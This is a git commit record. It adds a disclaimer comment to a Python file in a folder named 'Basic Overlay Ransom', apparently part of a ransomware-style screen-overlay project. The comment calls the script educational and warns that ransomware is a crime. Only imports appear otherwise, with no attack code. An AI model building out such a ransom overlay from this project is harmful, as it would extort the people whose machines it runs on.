240b908ba6c75e81e487f1fecec52d1be8fa6f84
CaliNux <132522491+calinux-py@users.noreply.github.com>
2023-08-01 18:40:22 -0700

    Update FlipperVersion.py

--- Basic Overlay Ransom/FlipperVersion.py
+++ Basic Overlay Ransom/FlipperVersion.py
@@ -1,3 +1,6 @@
+# This script is for educational purposes. Only a fool would actually try to harm someone using this script. All scripts involved in this process purposely lack
+# clean up code for the final steps. You will get caught. Ransomware is a crime and scamming is evil. Dont be evil.
+
 import tkinter as tk
 from PIL import Image, ImageTk
 import os
